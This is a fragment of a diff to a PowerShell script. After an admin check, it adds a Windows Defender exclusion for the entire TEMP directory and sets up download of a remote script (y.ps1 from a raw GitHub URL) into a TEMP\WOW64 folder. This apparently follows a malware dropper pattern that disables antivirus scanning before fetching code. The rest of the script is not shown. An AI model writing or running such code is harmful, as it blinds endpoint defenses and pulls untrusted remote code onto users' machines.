@@ -8,11 +8,11 @@ if (-not $Elevation.IsInRole($AdminRole)) {
     exit
 }
 
+Add-MpPreference -ExclusionPath $env:TEMP
+
 $url = "https://raw.githubusercontent.com/jusnih/x/refs/heads/main/y.ps1"
 $folder = "$env:TEMP\WOW64"
 $scriptPath = "$folder\y.ps1"
-
-Add-MpPreference -ExclusionPath $folder
 
 New-Item -Path $folder -ItemType Directory -Force | Out-Null
 
